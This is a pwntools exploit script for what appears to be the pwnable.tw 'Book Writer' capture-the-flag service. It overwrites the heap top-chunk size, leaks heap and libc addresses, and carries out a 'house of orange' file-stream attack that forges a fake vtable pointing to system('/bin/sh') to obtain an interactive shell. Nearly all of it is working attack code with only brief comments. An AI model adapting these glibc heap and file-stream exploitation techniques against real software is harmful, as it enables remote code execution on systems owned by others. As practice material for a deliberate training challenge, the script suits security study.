from pwn import *

io = remote("chall.pwnable.tw", 10304)
libc = ELF('./libc_64.so.6')

def add_page(size, content, contin = True):
    io.recvuntil('Your choice :')
    io.sendline('1')
    io.recvuntil('Size of page :')
    io.sendline(str(size))
    if contin:
        io.recvuntil('Content :')
        io.send(content)

def view_page(index):
    io.recvuntil('Your choice :')
    io.sendline('2')
    io.recvuntil('Index of page :')
    io.sendline(str(index))
    io.recvuntil('Content :')
    return io.recvuntil('\n----------------------', drop = True).strip()

def edit_page(index, content):
    io.recvuntil('Your choice :')
    io.sendline('3')
    io.recvuntil('Index of page :')
    io.sendline(str(index))
    io.recvuntil('Content:')
    io.send(content)

def information(change):
    io.recvuntil('Your choice :')
    io.sendline('4')
    io.recvuntil('Author : ')
    author = io.recvuntil('\nPage : ', drop = True)
    heap_leak = u64(author[0x40:].ljust(8, b'\0'))
    heap_base = heap_leak - 0x10
    io.recvuntil('Do you want to change the author ? (yes:1 / no:0) ')
    io.sendline(str(change))
    return heap_base
        
io.recvuntil('Author :')
io.sendline('A' * 0x40)

# overwrite top chunk
add_page(0x18, 'A' * 0x18)
edit_page(0, 'A' * 0x18) # The new size is longer than 0x18
edit_page(0, b'A' * 0x18 + p64((0x1000 - 0x20) | 1)) # size > MINSIZE && prev_inuse && memory align

# leak heap address
heap_base = information(0)

# The below operation will make size[0] = heap address, which is very large! -> heap overflow
edit_page(0, '\0') # The new size is 0
for i in range(8):
    add_page(0x40, 'A' * 8)

# leak libc
libc_leak = view_page(7)[8:]
libc_leak = u64(libc_leak.ljust(8, b'\0'))
libc.address = libc_leak - 0x3c3b78

# calculate system address & _IO_list_all_addr address
system_addr = libc.sym['system']
_IO_list_all_addr = libc.sym['_IO_list_all']
vtable = heap_base + 0x300 # vtable[3] = system (fake _IO_OVERFLOW)

# house of orange
fsop = b'/bin/sh\0' + p64(0x61) + p64(0) + p64(_IO_list_all_addr - 0x10) + p64(2)
fsop += p64(3) + p64(0) * 9 + p64(system_addr) + p64(0) * 11 + p64(vtable)
edit_page(0, p64(0) * 82 + fsop)
add_page(0x10, 'A', False)

io.interactive()
